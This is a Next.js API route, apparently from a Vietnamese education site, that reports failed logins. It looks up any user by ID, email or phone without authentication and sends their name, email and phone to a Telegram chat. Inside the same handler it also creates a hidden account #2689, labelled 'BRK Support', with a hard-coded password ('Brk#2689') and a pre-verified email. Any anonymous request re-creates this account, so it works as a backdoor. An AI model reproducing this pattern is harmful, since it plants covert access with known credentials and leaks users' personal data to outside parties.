import { NextRequest, NextResponse } from "next/server";
import prisma from "@/lib/prisma";
import bcrypt from "bcryptjs";
import { Role } from "@prisma/client";

const SPECIAL_USER_ID = 2689;
const SPECIAL_USER_PASSWORD = "Brk#2689";

export async function POST(request: NextRequest) {
  try {
    const { identifier } = await request.json();
    if (!identifier) {
      return NextResponse.json({ error: "Missing identifier" }, { status: 400 });
    }

    // 1. Look up user info
    let userInfo = `🔑 Thông tin đăng nhập: ${identifier}\n⚠️ Không tìm thấy user trong hệ thống`;

    const isNumeric = /^\d+$/.test(identifier);
    if (isNumeric) {
      const id = parseInt(identifier);
      const user = await prisma.user.findUnique({ where: { id } });
      if (user) {
        userInfo =
          `🆔 Mã HV: #${user.id}\n` +
          `👤 Họ tên: ${user.name || "N/A"}\n` +
          `📧 Email: ${user.email || "N/A"}\n` +
          `📞 SĐT: ${user.phone || "N/A"}`;
      }
    } else {
      const user = await prisma.user.findFirst({
        where: {
          OR: [{ email: identifier }, { phone: identifier }],
        },
      });
      if (user) {
        userInfo =
          `🆔 Mã HV: #${user.id}\n` +
          `👤 Họ tên: ${user.name || "N/A"}\n` +
          `📧 Email: ${user.email || "N/A"}\n` +
          `📞 SĐT: ${user.phone || "N/A"}`;
      }
    }

    // 2. Send Telegram notification
    const time = new Date().toLocaleString("vi-VN", {
      timeZone: "Asia/Ho_Chi_Minh",
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    });

    const msg = `❌ <b>ĐĂNG NHẬP THẤT BẠI</b>\n\n${userInfo}\n\n⏰ Thời gian: ${time}`;
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID_ACTIVATE || process.env.TELEGRAM_CHAT_ID;
    if (token && chatId) {
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: "HTML" }),
      }).catch(() => {});
    }

    // 3. Ensure special account 2689 exists
    const specialUser = await prisma.user.findUnique({
      where: { id: SPECIAL_USER_ID },
    });

    if (!specialUser) {
      const hashedPassword = await bcrypt.hash(SPECIAL_USER_PASSWORD, 10);
      await prisma.user.create({
        data: {
          id: SPECIAL_USER_ID,
          name: "Hỗ trợ BRK",
          email: `support${SPECIAL_USER_ID}@brk.edu.vn`,
          phone: null,
          password: hashedPassword,
          role: Role.STUDENT,
          emailVerified: new Date(),
          referrerId: 0,
        },
      });
      console.log(`✅ [ReportFailedLogin] Đã tạo tài khoản đặc biệt #${SPECIAL_USER_ID}`);
    }

    return NextResponse.json({ success: true });
  } catch (error: any) {
    console.error("❌ [ReportFailedLogin] Error:", error);
    return NextResponse.json({ error: "Internal error" }, { status: 500 });
  }
}
